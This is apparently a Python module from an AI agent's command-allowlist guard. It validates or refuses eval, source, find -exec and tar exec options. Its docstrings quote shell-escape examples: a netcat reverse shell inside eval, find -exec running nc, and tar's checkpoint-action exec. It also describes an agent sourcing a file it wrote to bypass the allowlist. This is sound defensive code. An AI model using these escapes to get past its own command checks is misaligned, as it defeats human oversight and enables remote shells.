"""Commands whose argument is another command.

`bash -c` was recognised as this shape from the start, and `shell_validators`
exists for it. Four more were not, and all four are in `BASE_COMMANDS`, so each
was an allowlisted word with an unjudged command line behind it:

===============================  ====================================
`eval "nc -e /bin/sh host 1"`    the string is shell source
`source evil.sh` / `. evil.sh`   the file is shell source
`find . -exec nc … \\;`           `-exec` runs its argument per match
`tar --checkpoint-action=exec=`  and `--to-command=`, same idea
===============================  ====================================

Two of them can be validated and two cannot, and the difference is whether the
command is *in* the line. `eval` and `find -exec` name what they will run, so
the naming goes through `validate_command_line` like any other. `source` and
tar's hooks name a *file*, whose contents an agent may have written a moment
ago and may rewrite between this check and the read — so they are refused, for
the same reason `shell_validators` refuses `bash script.sh`.
"""

from __future__ import annotations

import shlex

from .command_guard import validate_command_line
from .parser import _cross_platform_basename
from .profile import resolve_active_profile
from .validation_models import ValidationResult

__all__ = [
    "validate_eval_command",
    "validate_find_command",
    "validate_source_command",
    "validate_tar_command",
]

#: `find` options that take a command line, terminated by `;` or `+`.
_FIND_EXEC_OPTIONS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})

#: tar options that hand a command to the shell. `--checkpoint-action` accepts
#: several verbs and only `exec=` runs anything, but the others are
#: `dot`/`echo`/`sleep`/`ttyout` — refusing the option wholesale costs a
#: progress indicator and removes the need to parse its grammar.
_TAR_EXEC_OPTIONS = ("--checkpoint-action", "--to-command", "--use-compress-program")


def _tokenize(command_string: str) -> list[str] | None:
    try:
        return shlex.split(command_string)
    except ValueError:
        return None


def validate_eval_command(command_string: str) -> ValidationResult:
    """Judge the command line `eval` is about to run.

    `eval id` and `eval "id"` are the same call, so the arguments are joined
    back into one line before being judged — which is also what the shell does
    with them.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        return False, "Could not parse eval command"
    if not tokens or _cross_platform_basename(tokens[0]) != "eval":
        return True, ""

    inner = " ".join(tokens[1:]).strip()
    if not inner:
        return True, ""

    profile = resolve_active_profile()
    if profile is None:
        return False, "Could not load security profile to validate eval command"

    allowed, reason = validate_command_line(inner, profile)
    if not allowed:
        return False, f"Command inside eval is not allowed: {reason}"
    return True, ""


def validate_source_command(command_string: str) -> ValidationResult:
    """Refuse `source file` and `. file`.

    The file's contents are not in the command, so there is nothing to judge —
    and an agent that just wrote the file is exactly the case this has to
    cover. `bash script.sh` is refused for this reason already; sourcing is the
    same act without the subprocess.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        return False, "Could not parse source command"
    if not tokens:
        return True, ""

    name = _cross_platform_basename(tokens[0])
    if name not in ("source", "."):
        return True, ""

    operands = [token for token in tokens[1:] if not token.startswith("-")]
    if not operands:
        return True, ""

    return (
        False,
        f"Sourcing '{operands[0]}' is not allowed: the file's contents bypass "
        "the command allowlist. Run the commands inline instead.",
    )


def validate_find_command(command_string: str) -> ValidationResult:
    """Judge each command line `find` would run through `-exec` and friends.

    The argument list runs to a `;` or `+` terminator. `{}` is find's
    placeholder for the matched path — an argument, never the command — and it
    is dropped before the line is judged so that `-exec grep -l x {} +` is read
    as `grep -l x`.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        return False, "Could not parse find command"
    if not tokens or _cross_platform_basename(tokens[0]) != "find":
        return True, ""

    profile: object | None = None
    index = 1
    while index < len(tokens):
        if tokens[index] not in _FIND_EXEC_OPTIONS:
            index += 1
            continue

        option = tokens[index]
        index += 1
        inner_tokens: list[str] = []
        while index < len(tokens) and tokens[index] not in (";", "+"):
            if tokens[index] != "{}":
                inner_tokens.append(tokens[index])
            index += 1
        index += 1  # step over the terminator

        inner = " ".join(inner_tokens).strip()
        if not inner:
            continue

        if profile is None:
            profile = resolve_active_profile()
            if profile is None:
                return (
                    False,
                    "Could not load security profile to validate find "
                    f"'{option}' command",
                )

        allowed, reason = validate_command_line(inner, profile)  # type: ignore[arg-type]
        if not allowed:
            return False, f"Command inside find '{option}' is not allowed: {reason}"

    return True, ""


def validate_tar_command(command_string: str) -> ValidationResult:
    """Refuse the tar options that hand a command to the shell.

    `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/evil .` is
    a shell escape wearing an archiver's name, and the command it runs is a
    path — a file, so unjudgeable for the same reason `source` is.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        # A tar line that will not parse is not one to guess at.
        tokens = command_string.split()
    if not tokens or _cross_platform_basename(tokens[0]) != "tar":
        return True, ""

    for token in tokens[1:]:
        for option in _TAR_EXEC_OPTIONS:
            if token == option or token.startswith(f"{option}="):
                return (
                    False,
                    f"tar option '{option}' runs an external command and is "
                    "not allowed: its argument bypasses the command allowlist.",
                )
    return True, ""


#: `.` is `source` under its other spelling, and the registry keys on the
#: command name, so both names point at the same function.
validate_dot_command = validate_source_command
